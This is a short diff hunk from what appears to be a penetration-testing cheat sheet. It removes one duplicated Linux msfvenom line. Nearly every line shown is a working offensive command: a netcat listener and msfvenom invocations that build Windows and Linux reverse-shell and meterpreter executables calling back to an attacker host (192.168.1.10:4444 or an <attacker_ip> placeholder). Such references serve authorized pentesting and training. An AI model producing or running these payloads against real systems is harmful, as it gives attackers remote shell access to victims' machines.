@@ -70,8 +70,6 @@ nc -lvnp <PORT>
 msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o reverse_shell.exe
 # Windows meterpreter reverse shell
 msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o reverse_shell.exe
-# Linux reverse shell
-msfvenom -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o reverse_shell.elf
 # Linux ELF reverse shell
 msfvenom -a x64 -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf
 # PHP reverse shell
